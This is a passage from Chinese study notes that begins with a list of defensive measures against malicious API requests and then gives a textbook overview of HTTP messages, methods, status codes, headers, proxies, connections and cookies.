3. 归属地，检测 IP 所在地是否与手机号归属地匹配；IP 所在地是否是为常在地。
4. 可疑用户，对于可疑用户要求其主动发短信（或其他主动行为）来验证身份。
5. 黑名单，对于黑名单用户，限制其操作，API 接口直接返回 success，1 可以避免浪费资源，2 混淆黑户判断。
6. 签名，API 接口启用签名策略，签名可以保障请求 URL 的完整安全，签名匹配再继续下一步操作。
7. token，对于重要的 API 接口，生成 token 值做验证。
8. 启用 https，https 需要秘钥交换，可以在一定程度上鉴别是否伪造 IP。
9. 代码混淆，发布前端代码混淆过的包。
10. 数据安全，数据安全方面做策略，攻击者得不到有效数据，提高攻击者成本。
11. 利用恶意IP库，<https://threatbook.cn/>，过滤恶意IP。



#### 参考资料

- [维基百科：跨站脚本](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)
- [维基百科：SQL 注入攻击](https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A)
- [维基百科：跨站点请求伪造](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
- https://blog.csdn.net/zhydream77/article/details/85694614



### HTTP

#### TCP与HTTP

TCP 与 HTTP 的关系如下。

<img src="assets/tcp-and-http.jpg" style="zoom:62%;" />

#### URI与URL

##### 1. 概念

URI 包含 URL 和 URN。**URI** 的作用像**身份证号**一样，**URL** 的作用更像**家庭住址**一样。URL 是一种具体的 URI，它不仅唯一标识资源，而且还提供了定位该资源的信息。

<img src="assets/1563596175716.png" alt="1563596175716" style="zoom: 56%;" />

资源定位符 URL 是对可以从互联网上得到的资源的位置和访问方法的一种简洁表示。URL 给资源的位置提供一种抽象的识别方法，并用这种方法给资源定位。只要能够对资源定位，系统就可以对资源进行各种操作，如存取、更新、替换和查找其属性。URL 相当于一个文件名在网络范围的扩展。因此 URL 是与互联网相连的机器上的任何可访问对象的一个指针。 

##### 2. **URL的一般格式**

一般格式如下：

```java
<协议>://<主机>:<端口>/<路径>
```

- **协议**：FTP：文件传输协议； HTTP：超文本传输协议。

- **://** ：固定格式。

- **主机**：存放资源的主机，在互联网中的域名或IP 地址。

- **端口路径**：指明资源具体路径。

##### 3. **万维网工作过程**

![1574746064533](assets/1574746064533.png)



#### 请求和响应报文

由于 HTTP 是面向正文的 (text-oriented)，因此在报文中的每一个字段都是一些 **ASCII 码串**，因而每个字段的长度都是**不确定**的。

##### 1. 请求报文

> **请求报文格式？**

<img src="assets/image-20191229152139723.png" alt="image-20191229152139723" style="zoom:100%;" />

GET 请求的**参数**直接在 URL 中，没有请求体，而 POST 请求的参数通常在请求体中。**POST 请求**的示例：

```http
POST /search HTTP/1.1        
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, 
application/msword, application/x-silverlight, application/x-shockwave-flash, */*  
Referer: http://www.google.cn/  
Accept-Language: zh-cn  
Accept-Encoding: gzip, deflate  
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; TheWorld)  
Host: www.google.cn 
Connection: Keep-Alive  
Cookie: PREF=ID=80a06da87be9ae3c:U=f7167333e2c3b714:NW=1:TM=1261551909:LM=1261551917:S=ybYcq2wpfefs4V9g; 
NID=31=ojj8d-IygaEtSxLgaJmqSjVhCspkviJrB6omjamNrSm8lZhKy_yMfO2M4QMRKcH1g0iQv9u-2hfBW7bUFwVh7pGaRUb0RnHcJU37y-
FxlRugatx63JLv7CWMD6UB_O_r  
										# 空行
hl=zh-CN&source=hp&q=domety  			# 请求体
```

##### 2. 响应报文

响应报文结构如下：

<img src="assets/image-20191229152226696.png" alt="image-20191229152226696" style="zoom: 50%;" />

响应报文的例子：

```http
HTTP/1.1 200 OK
Date: Mon, 23 May 2005 22:38:34 GMT
Content-Type: text/html; charset=UTF-8
Content-Encoding: UTF-8
Content-Length: 138
Last-Modified: Wed, 08 Jan 2003 23:11:55 GMT
Server: Apache/1.3.3.7 (Unix) (Red-Hat/Linux)
ETag: "3f80f-1b6-3e1cb03b"
Accept-Ranges: bytes
Connection: close
								# 空行
<html>
	<head>
  		<title>An Example Page</title>
	</head>
	<body>
  		Hello World, this is a very simple HTML document.
	</body>
</html>
```



#### HTTP方法

客户端发送的 **请求报文** 第一行为请求行，包含了**方法**字段。

|    方法     |          说明          | 支持的HTTP协议版本 |
| :---------: | :--------------------: | :----------------: |
|   **GET**   |      **获取资源**      |      1.0、1.1      |
|  **POST**   |    传输实**体主体**    |      1.0、1.1      |
|   **PUT**   |        传输文件        |      1.0、1.1      |
|  **HEAD**   |    获得报文**首部**    |      1.0、1.1      |
| **DELETE**  |        删除资源        |      1.0、1.1      |
| **OPTIONS** |     询问支持的方法     |        1.1         |
|  **TRACE**  |        追踪路径        |        1.1         |
| **CONNECT** | 要求用隧道协议连接代理 |        1.1         |

LINK 和 UNLINK 已被 HTTP/1.1 **废弃**。

##### 1. GET

请求访问已被 URI 识别的资源。当前网络请求中，绝大部分使用的是 GET 方法。

##### 2. POST

传输实体的主体。POST 主要用来**传输数据**，而 GET 主要用来获取资源。

##### 3. PUT

上传文件。由于自身不带验证机制，任何人都可以上传文件，因此**存在安全性**问题，一般**不使用**该方法。

```http
PUT /new.html HTTP/1.1
Host: example.com
Content-type: text/html
Content-length: 16

<p>New File</p>
```

##### 4. HEAD

获取**报文首部**。和 GET 方法类似，但是**不返回报文实体主体**部分。主要用于确认 URL 的有效性以及资源更新的日期时间等。

##### 5. PATCH

对资源进行**部分修改**。PUT 也可以用于**修改资源**，但是只能**完全替代**原始资源，PATCH 允许**部分修改**。

```http
PATCH /file.txt HTTP/1.1
Host: www.example.com
Content-Type: application/example
If-Match: "e0023aa4e"
Content-Length: 100

[description of changes]
```

##### 6. DELETE

删除文件。与 PUT 功能相反，并且同样**不带验证**机制。

```http
DELETE /file.html HTTP/1.1
```

##### 7. OPTIONS

查询服务器**支持的方法**。查询指定的 URI 能够**支持的方法**。会返回 `Allow: GET, POST, HEAD, OPTIONS` 这样的内容。

##### 8. CONNECT

要求在与代理服务器通信时**建立隧道**。使用 **SSL**（Secure Sockets Layer，安全套接层）和 **TLS**（Transport Layer Security，传输层安全）协议把通信内容**加密**后经网络隧道传输。要求与代理服务器通信时**建立隧道**，实现用隧道协议进行 TCP 通信。

```http
CONNECT www.example.com:443 HTTP/1.1
```

|                           请求                           |                 响应                  |
| :------------------------------------------------------: | :-----------------------------------: |
| CONNECT proxy.hackr.cn:8080 HTTP/1.1 Host:proxy.hacky.cn | HTTP/1.1 200 **OK**(之后进入网络隧道) |

##### 9. TRACE

**追踪路径**。服务器会将**通信路径**返回给客户端。发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。通常不会使用 TRACE，并且它容易受到 **XST** 攻击（Cross-Site Tracing，跨站追踪）。



#### HTTP状态码

服务器返回的 **响应报文** 中第一行为**状态行**，包含了状态码以及原因短语，用来告知客户端请求的结果。

| 状态码  |                 类别                 |            含义            |
| :-----: | :----------------------------------: | :------------------------: |
| **1XX** |  Informational（**信息性**状态码）   |     接收的请求正在处理     |
| **2XX** |      Success（**成功**状态码）       |      请求正常处理完毕      |
| **3XX** |   Redirection（**重定向**状态码）    | 需要进行附加操作以完成请求 |
| **4XX** | Client Error（**客户端错误**状态码） |     服务器无法处理请求     |
| **5XX** | Server Error（**服务器错误**状态码） |     服务器处理请求出错     |

##### 1. 1XX 信息

-  **100 Continue** ：表明到目前为止都很正常，客户端可以继续发送请求或者**忽略**这个响应。

##### 2. 2XX 成功

-  **200 OK** ：成功。
-  **204 No Content** ：请求已经**成功处理**，但是返回的响应报文**不包含实体的主体**部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。
-  **206 Partial Content** ：表示客户端进行了**范围请求**，响应报文包含由 Content-Range 指定范围的实体内容。

##### 3. 3XX 重定向

-  **301 Moved Permanently** ：**永久性**重定向。
-  **302 Found** ：**临时性**重定向。
-  **303 See Other** ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。
-  **304 Not Modified** ：**协商缓存**。当第一次请求网页时，会把各种资源（如图片等）从服务器拉取下来，浏览器一般会进行资源缓存，第二次如果刷新请求，如果资源的 **Etag** 值会被放到 **If-None-Match** 请求头里被发送给服务器，如果资源没有变化，那么服务器会返回 304，浏览器可以继续用这些资源。
-  **307 Temporary Redirect** ：临时重定向，与 302 的含义类似，但是 307 要求浏览器**不会**把重定向请求的 POST 方法改成 GET 方法。

##### 4. 4XX 客户端错误

说明是客户端存在错误。

-  **400 Bad Request** ：请求报文中存在**语法错误**。
-  **401 Unauthorized** ：**未认证**。该状态码表示发送的请求需要有**认证信息**（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。
-  **403 Forbidden** ：请求被服务器**拒绝**。
-  **404 Not Found** ：资源未找到。
-  **405**：服务器不支持当前的 HTTP 请求方法。

##### 5. 5XX 服务器错误

-  **500 Internal Server Error** ：服务器正在**执行请求时**发生错误。
-  **502 Bad Gateway**：**网关错误**。
-  **503 Service Unavailable** ：服务器暂时处于**超负载**或正在进行**停机维护**，现在无法处理请求。



#### HTTP首部

有 4 种类型的首部字段：**通用首部字段、请求首部字段、响应首部字段和实体首部字段**。

表示方式：

```c
首部字段名：首部字段值
```

字段值对应单个 HTTP 首部字段可以有**多个**值：

```http
cache-control: public, max-age=0
```

各种**首部**字段及其含义如下（不需要全记，仅供查阅）：

##### 1. 通用首部字段

通用首部字段是请求与响应**都可以**使用的字段。

|    首部字段名     |                    说明                    |
| :---------------: | :----------------------------------------: |
| **Cache-Control** |             控制**缓存**的行为             |
|    Connection     | 控制不再转发给代理的首部字段、管理持久连接 |
|       Date        |           创建报文的**日期**时间           |
|      Pragma       |                报文**指令**                |
|      Trailer      |             报文末端的首部一览             |
| Transfer-Encoding |         指定报文主体的传输编码方式         |
|      Upgrade      |               升级为其他协议               |
|        Via        |            代理服务器的相关信息            |
|      Warning      |                  错误通知                  |

######  1. Cache-Control

通过指定首部字段 Cache-Control 的指令，就能操作**缓存**的工作机制。

指令的参数是可选的，多个指令之间通过“,”分隔。首部字段 Cache-Control 的指令可用于请求及响应时。

```http
Cache-Control: private, max-age=0, no-cache
```

**缓存请求指令**

|         指令          |  参数  |                    说明                    |
| :-------------------: | :----: | :----------------------------------------: |
|   ==**no-cache**==    |   无   | **强制**向源服务器**再次验证**（协商缓存） |
|   ==**no-store**==    |   无   |       **不缓存**请求或响应的任何内容       |
|  **max-age = [ 秒]**  |  必需  |              响应的最大Age值               |
|  max-stale( = [ 秒])  | 可省略 |              接收已过期的响应              |
| **min-fresh = [ 秒]** |  必需  |        期望在指定时间内的响应仍有效        |
|     no-transform      |   无   |            代理不可更改媒体类型            |
|    only-if-cached     |   无   |               从缓存获取资源               |
|    cache-extension    |   -    |            新指令标记（token）             |

换言之，无参数值的首部字段可以使用缓存。

从字面意思上很容易把 **no-cache** **误解**成为不缓存，但事实上 **no-cache 代表不缓存过期的资源**，缓存会向源服务器进行有效期确认后处理资源，也许称为 do-notserve-from-cache-without-revalidation 更合适。**no-store 才是真正地不进行缓存**，注意区别理解。

###### 2. Connection

(1) 控制**不再转发给代理**的首部字段。

<img src="assets/image-20191229160240703.png" alt="image-20191229160240703" style="zoom:60%;" />

```http
Connection: 不再转发的首部字段名
```

(2) 管理**持久**连接。

HTTP1.1 **之前**默认不是长连接，如果要持久连接需要设置为 **Keep-Alive**。HTTP1.1 之后默认长连接了。

```http
Connection : Keep-Alive
```

###### 3. Transfer-Encoding

规定了传输报文主体时采用的**编码方式**（仅对分块传输编码有效）。

###### 4. Upgrade

用于检测 HTTP 协议及**其他协议**是否可使用**更高的版本**进行通信，其参数值可以用来指定一个完全不同的通信协议（仅限与客户端和临接服务器之间，因此使用首部字段 Upgrade 时还需要额外指定 connection：Upgrade ）

![image-20191229160604148](assets/image-20191229160604148.png)

使用 **WebSocket** 需要**切换协议**使用这个。

###### **5. Via**

为了**追踪客户端和服务器之间的请求和响应报文的传输路径**。当报文经过**代理或网关**时，会先在**首部字段 Via 中附加**该服务器的信息，然后在进行转发。多与 TRACE 方法一起使用。

![image-20191229160700159](assets/image-20191229160700159.png)

##### 2. 请求首部字段

是从客户端往服务器端发送**请求报文**中所使用的字段，用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。

|     首部字段名      |                      说明                       |
| :-----------------: | :---------------------------------------------: |
|     **Accept**      |        **用户**代理可处理的**媒体类型**         |
|   Accept-Charset    |                  优先的字符集                   |
|   Accept-Encoding   |                 优先的内容编码                  |
|   Accept-Language   |             优先的语言（自然语言）              |
|  **Authorization**  |      **Web 认证信息**（可存放 **Token**）       |
|       Expect        |              期待服务器的特定行为               |
|        From         |               用户的电子邮箱地址                |
|      **Host**       |               请求资源所在服务器                |
|    **If-Match**     |              比较实体标记（ETag）               |
|  If-Modified-Since  |               比较资源的更新时间                |
|  **If-None-Match**  |      **比较实体标记**（与 If-Match 相反）       |
|      If-Range       |      资源未更新时发送实体 Byte 的范围请求       |
| If-Unmodified-Since | 比较资源的更新时间（与 If-Modified-Since 相反） |
|    Max-Forwards     |                 最大传输逐跳数                  |
| Proxy-Authorization |         代理服务器要求客户端的认证信息          |
|      **Range**      |             实体的字节**范围请求**              |
|     **Referer**     |          对请求中 URI 的**原始获取方**          |
|         TE          |                传输编码的优先级                 |
|     User-Agent      |              HTTP 客户端程序的信息              |

###### **1. Accept**

通知服务器，用户代理能够处理的媒体类型及**媒体类型**的相对优先级，可以使用 q=num 来代表**权重的优先值**，权重值 num 的取值范围是0-1，可以精确到三位小数，1为权重最大值，默认为1.

> Accept: text/html,application/json;q=0.9, application/xml;q=0.8

###### **2. Accept-Charset**

首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序，权重用法同 Accept 字段的 q。

###### **3. Accept-Encoding**

首部字段可用来通知服务器用户代理支持的内容编码及编码的优先级，可以一次性指定多种内容编码,采用权重q表示优先级。

```undefined
Accept-Encoding: gzip, deflate, cpmpress, identity
```

###### **4. Accept-Language**

首部字段用来告知服务器，用户代理能够处理的语言，采用权重 q 指定优先级

###### **5. Authorization**

用来告知服务器用户代理的**认证信息**， 用于验证用户身份的凭证。使用 **Token 认证**时，将 Token 放在这个首部字段下。

###### **6. Host**

指明请求服务器的**域名**， 及服务器所**监听的 TCP 端口号**，如果没有给定端口，会自动使用被请求服务的默认端口， 用于告知服务器请求资源所处的服务器域名及端口号。**唯一一个==必须被包含==在请求内的首部字段**。如果一个 IP 对应多个域名， 那就用 Host 字段指明服务器主机。

----

###### 7. 条件请求

> 形如 **if-XXXX** 的请求首部字段，都是**条件请求**，服务器接收到**附带的请求条件**后，只有**当条件满足时**，服务器才会执行。

###### **8. if-Match**

通常在请求方法为 GET 时，服务器仅在请求资源的 ETag 值为 if-Match 首部字段值之一时，才会返回资源，当请求方法为 PUT 时，才允许上传资源。ETag 为一份资源独一无二的实体标记，资源更新后实体标记值 ETag 也会更新。

###### **9. if-Modified-since**

通常该字段只用在 GET 请求中，如果资源在 if-Modified-Since 字段值日期之后发生更新，则服务器接受该请求， 否则会返回一个不带响应体的 304（Not Modified），用于确认代理或客户端本地资源的有效性。

###### **10. if-None-Match**

当且仅当服务器上**没有任何资源**的实体标记 **ETag 值**与该首部字段中列出的值**相对应**，服务器才会返回所请求的资源，**否则返回 304**。

###### **11. if-Range**

范围请求。用来当满足条件时（当 if-range 字段值中的条件得到满足，通常是满足 last-Modified 或 ETag），是 Range 字段起作用，服务器返回 206 Partial Content，如果 if-Range 字段值中的条件没有得到满足，则作为正常处理返回 200 OK 的**全部**资源。

----

###### **12. Proxy-Authorization**

用于用户代理给代理服务器发送身份验证的凭证。

```jsx
Proxy-Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l
```

###### **13. Range**

用于只需获取部分资源的**范围请求**，字段值表明服务器资源的指定范围。

```xml
Range: <unit>=<range-start>-<range-end>, <range-start>-<range-end>
```

###### **14. Referer**

可以根据 Referer 查看请求资源的是从**哪个页面**发起的。

###### **15. TE**

告知服务器客户端能够处理响应的传输编码方式以及相对优先级。

###### **16. User-Agent**

将创建请求的浏览器和用户代理信息等名称传达给服务器。**爬虫**必备。

##### 3. 响应首部字段

响应首部字段是由服务器端向客户端返回**响应报文**中所使用的字段，用于补充响应的附加信息、服务器信息、以及对客户端的附加要求信息。

|      首部字段名      |             说明             |
| :------------------: | :--------------------------: |
|    Accept-Ranges     |   是否接受字节**范围请求**   |
|       **Age**        |   推算资源**创建**经过时间   |
|       **ETag**       |      资源的**匹配信息**      |
|       Location       |   令客户端重定向至指定 URI   |
|  Proxy-Authenticate  | 代理服务器对客户端的认证信息 |
|     Retry-After      |   对再次发起请求的时机要求   |
|      **Server**      |  HTTP 服务器的**安装信息**   |
|       **Vary**       | 代理**服务器缓存**的管理信息 |
| **WWW-Authenticate** | 服务器对客户端的**认证信息** |

###### **1. Accept-Ranges**

用于告知客户端服务器能否处理范围请求。

```swift
Accept-Ranges: none | bytes    // none就是不能
```

###### **2. Age**

能告知客户端，源服务器在**多久前**创建了响应，字段值的单位为秒。

###### **3. ETag**

它是一种将**资源**以字符串的形式做唯一标识性的方式，服务器会为**每份资源分配对应的 ETag 值**，当资源更新时，ETag值也会更新。没有特定的生成算法，通常使用资源最后修改时间戳的哈希值，或散列或版本号。
用处：1. 防止资源的同时更新而导致的相互覆盖（空中碰撞） 2. 缓存未更改的资源。

###### **4. Location**

指定需要将页面**重新定向**至的地址。

###### **5. Proxy-Authenticate**

会把由代理服务器所要求的认证信息发送给客户端。指定了获取代理服务器上的资源访问权限而采用的身份验证方式。代理服务器对请求进行验证，以便它进一步传递请求。

###### **6. Retry-After**

告知客户端应该在多久后可以再次发起请求。主要配合状态码 **503**（Service Unavailable）响应。

###### **7. Server**

首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。

###### **8. Vary**

当代理服务器接收到带有 Vary 首部字段指定获取资源的请求时，如果使用的 Accept-Language 字段的值相同，那么就直接从源服务器返回响应，反之，则需要先从源服务器获取资源后才能作为响应返回。

###### **9. WWW-Authenticate**

用于 HTTP 访问**认证**。它会告知客户端适用于访问请求的 URI 所指定资源的认证方案（Basic 或是 Digest）；定义了何种验证方式去获取对资源的连接。

#####  4. 实体首部字段

实体首部字段是包含在请求报文和响应报文中的**实体部分所使用的首部**，用于补充内容的更新时间与实体相关的信息。请求报文和响应报文中都含有的与实体相关的首部。

|      首部字段名      |            说明             |
| :------------------: | :-------------------------: |
|      **Allow**       | 资源可**支持的 HTTP 方法**  |
|   Content-Encoding   |   实体主体适用的编码方式    |
| **Content-Language** |     实体主体的自然语言      |
|    Content-Length    | 实体主体部分的大小（bites） |
|   Content-Location   |     替代对应资源的 URI      |
|     Content-MD5      |     实体主体的报文摘要      |
|  **Content-Range**   |     实体主体的位置范围      |
|   **Content-Type**   |     实体主体的媒体类型      |
|     **Expires**      | 实体主体**过期的日期**时间  |
|  **Last-Modified**   |   资源的最后修改日期时间    |

###### **1. ALlow**

由于枚举资源所支持的 HTTP 方法的**集合**，当服务器接收到不支持的HTTP方法时，会返回 **405**（Method Not Allowed ）作为响应返回，于此同时还会把**所有能支持**的 HTTP 方法写入首部字段 Allow 返回。

```http
Allow: GET, POST, HEAD
```

###### **2. Content-Encoding**

告知客户端服务器对实体的**主体部分**选用的内容**编码**方式。（内容编码是指在不丢失实体信息的前提下所进行的压缩）常用的有 gzip、compress、deflate、 identify;

###### **3. Content-Language**

告知客户端实体主体使用的自然语言。

```http
Content-Language: zh-CN
```

###### **4. Content-Location**

首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首部字段 Location 不同，Content-Location 表示的是报文主体返回的资源对应的 URI。

###### **5. Content-type**

说明了实体主体部分的**媒体类型**，和首部字段 Accept 一样，字段值用 type/subtype 形式赋值

###### **6. Expires**

会将**资源失效的日期**告知客户端，缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在 Expires 字段值指定的时间之前，响应的副本会一直保存，当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。



#### HTTP基本应用

##### 1. 用单台虚拟主机实现多个域名

HTTP/1.1 规范允许一台 HTTP 服务器搭建多个 web 站点。即使物理层面只有一台服务器，但只要使用**虚拟主机**的功能，则可以假想已具有**多台服务器**。在互联网上，域名通过 DNS 服务映射到 IP 地址（域名解析）之后访问目标网站。可见，当请求发送到服务器时，已经是以 IP 地址形式访问了。

所以，如果一台服务器内托管了 www.tricorder.jp 和 www.hackr.jp 这两个域名，当收到请求时就需要弄清楚究竟要访问哪个域名。**一个 IP 地址可能对应多个域名**。

在相同的 IP 地址下，由于虚拟主机可以寄存多个不同主机名和域名的 web 网站，因此在发送 HTTP 请求时，必须在 **Host 首部**内完整指定主机名或域名的 **URI**。

##### 2. 代理、网关、隧道

这些应用程序和服务器可以将请求转发给通信线路上的下一站服务器，并且接收从那台服务器发送的响应再转发给客户端。

###### (1) 代理

**代理服务器**的基本行为就是接收客户端发送的请求后**转发**给其他服务器。代理**不改变**请求 URI，会直接发送给前方持有资源的目标服务器。持有资源实体的服务器被称为**源服务器**。从源服务器返回的响应经过代理服务器后再传给客户端。

![image-20191229155243444](assets/image-20191229155243444.png)

每次经过代理服务器转发请求或响应时，会**追加写入 Via 首部**信息。代理一般按两种基准分类：一是是否**使用缓存**，二是是否会**修改报文**。

**透明代理**：不对报文做任何修改。

**缓存代理**：会预先将资源的副本缓存保存在代理服务器上，会定期检查资源的有效性。当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回。

![image-20191229155538500](assets/image-20191229155538500.png)

使用代理服务器的理由有：利用缓存技术**减少网络带宽**的流量，组织内部针对**特定网站的访问控制**，以获取**访问日志**为主要目的等等。即：

- **缓存**
- **负载均衡**
- **网络访问控制**
- **访问日志记录**

代理服务器分为**正向代理和反向代理**两种：

- 正向代理：用户察觉得到正向代理的**存在**。

<img src="assets/1563596330167.png" alt="1563596330167" style="zoom:70%;" />

- 反向代理：一般位于**内部网络**中，用户察觉**不到**。

<img src="assets/1563596340136.png" alt="1563596340136" style="zoom:67%;" />

###### (2) 网关

网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供**非 HTTP 协议**服务。利用网关能提供通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。可以将**其他协议的通信通过网关转换为 HTTP 协议**的请求。

<img src="assets/image-20191229155707212.png" alt="image-20191229155707212" style="zoom:60%;" />

###### (3) 隧道

**隧道**可按要求建立起一条与其他服务器的通信线路，届时使用 **SSL** 等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全通信。

隧道本身**不会去解析** HTTP 请求。也就是说，请求保持**原样中转**给之后的服务器。隧道会在通信双方断开连接时结束。

![image-20191229155737735](assets/image-20191229155737735.png)

##### 3. 连接管理

###### (1) 短连接与长连接

**短连接**：在 **HTTP/1.0** 中默认使用**短连接**。也就是说客户端和服务器每进行一次 HTTP 操作，就**建立一次连接**，任务结束就中断连接。当客户端浏览器访问的某个 HTML 或其他类型的 Web 页中包含有其他的 Web 资源（如 JavaScript 文件、图像文件、CSS 文件等），每遇到这样一个 Web 资源，浏览器就会重新建立一个 HTTP 会话。如果每进行一次 HTTP 通信就要新建一个 TCP 连接，那么开销会很大。

<img src="assets/image-20191229153710786.png" alt="image-20191229153710786" style="zoom:42%;" />

**长连接**：从 **HTTP/1.1** 起，**默认使用长连接**，用以保持连接特性。使用长连接的 HTTP 协议，需要加入 **Connection** 请求头：

```javascript
Connection: keep-alive
```

在使用长连接的情况下，当一个网页打开完成后，客户端和服务器之间用于传输 HTTP 数据的 TCP 连接不会关闭，客户端再次访问这个服务器时，会继续使用这一条已经建立的连接。**Keep-Alive 不会永久保持连接**，它有一个**保持时间**，可以在不同的服务器软件（如Apache）中设定这个时间。实现长连接需要客户端和服务端都支持长连接。

**长连接**只需要建立一次 TCP 连接就能进行**多次 HTTP 通信**。

![image-20191229153753544](assets/image-20191229153753544.png)

- 从 **HTTP/1.1** **默认是长连接**的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 **Connection : close**；
- 在 **HTTP/1.0 默认是短连接**的，如果需要使用**长连接**，则使用 **Connection : Keep-Alive**。

HTTP 协议的长连接和短连接，实质上是 **TCP 协议的长连接和短连接**。

###### (2) 流水线

默认情况下，HTTP 请求是按**顺序**发出的，下一个请求只有在当前请求**收到响应之后**才会被发出。由于受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。**流水线**是在同一条长连接上连续发出请求，而不用等待响应返回，这样可以减少延迟。

![image-20191229153820798](assets/image-20191229153820798.png)

##### 4. Cookie

###### (1) HTTP的无状态性

> 如何理解HTTP协议是**无状态**的？

HTTP 协议是**无状态**的（stateless），指的是协议对于**事务处理没有记忆能力**，服务器**不知道客户端是什么状态**。也就是说，打开一个服务器上的网页和上一次打开这个服务器上的网页之间**没有任何联系**。HTTP 是一个无状态的面向连接的协议，无状态不代表 HTTP 不能保持 TCP 连接。 

HTTP 协议是**无状态**的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 **Cookie** 来**保存状态信息**。

###### (2) Cookie概述

Cookie 是**服务器**发送到**用户浏览器**并保存在本地的一小块数据，它会在浏览器之后向同一服务器再次发起请求时被**携带**上，用于告知服务端两个请求**是否来自同一浏览器**。由于之后**每次请求都会需要携带** Cookie 数据，因此会带来额外的性能开销（尤其是在移动环境下）。

Cookie 曾一度用于**客户端数据**的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 **Web storage API**（本地存储和会话存储）或 **IndexedDB**。

Cookie 用途：

- **会话状态管理**（如用户登录状态、购物车、游戏分数或其它需要记录的信息）。
- **个性化设置（**如用户自定义设置、主题等）。
- **浏览器行为跟踪**（如跟踪分析用户行为等）。

###### (3) 创建过程

服务器发送的**响应报文**包含 ==**Set-Cookie**== 首部字段，客户端得到响应报文后把 **Cookie** 内容保存到浏览器中。

```http
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco			// 设置cookie信息
Set-Cookie: tasty_cookie=strawberry		// 设置cookie信息

[page content]
```

客户端之后对同一个服务器发送请求时，会从浏览器中**取出 Cookie 信息**并**通过 Cookie 请求首部字段**发送给服务器。

```http
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry		// 请求时携带cookie信息
```

###### (4) 分类

- **会话期** Cookie：浏览器**关闭**之后它会被**自动删除**，也就是说它仅在会话期内有效。
- **持久性** Cookie：指定**过期时间**（**Expires**）或有效期（**max-age**）之后就成为了持久性的 Cookie。

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; // 指定了cookie的过期时间
```

###### (5) 作用域

**Domain** 标识指定了哪些**主机**可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。

**Path 标识**指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。例如，设置 Path=/docs，则以下地址都会匹配：

- /docs
- /docs/Web/
- /docs/Web/HTTP

###### (6) HttpOnly

浏览器通过 `document.cookie` 属性可**创建新的 Cookie**，也可通过该属性访问**非 HttpOnly 标记**的 Cookie。

```js
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
```

标记为 **HttpOnly** 的 Cookie **不能被 JavaScript 脚本调用**。**跨站脚本攻击 (XSS)** 常常使用 JavaScript 的 `document.cookie` API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 ==**XSS 攻击**==。

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

###### (7) Secure

标记为 **Secure** 的 Cookie 只能通过被 **HTTPS** 协议加密过的请求发送给服务端。即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其**固有的不安全性**，Secure 标记也无法提供确实的安全保障。

###### (8) Session

用户状态信息可以通过 **Cookie 存储**在用户**浏览器**中，也可以利用 **Session 存储在服务器端**，存储在服务器端的信息更加**安全**。Session 可以存储在服务器上的**文件、数据库或者内存**中。也可以将 Session 存储在 **Redis** 这种内存型数据库中，效率会更高。使用 Session 维护用户登录状态的过程如下：

- 用户进行**登录**时，用户提交包含用户名和密码的**表单**，放入 HTTP **请求报文**中；
- 服务器验证该用户名和密码，如果正确则把用户信息存储到 **Redis** 中，它在 Redis 中的 Key 称为 **SessionId**；
- 服务器返回的响应报文的 **Set-Cookie** 首部字段包含了这个 **SessionId**，客户端收到响应报文之后将该 Cookie 值**存入浏览器**中；
- 客户端之后对同一个服务器进行请求时会包含该 **Cookie** 值，服务器收到之后提取出 **SessionId**，从 Redis 中**取出**用户信息，继续之前的业务操作。

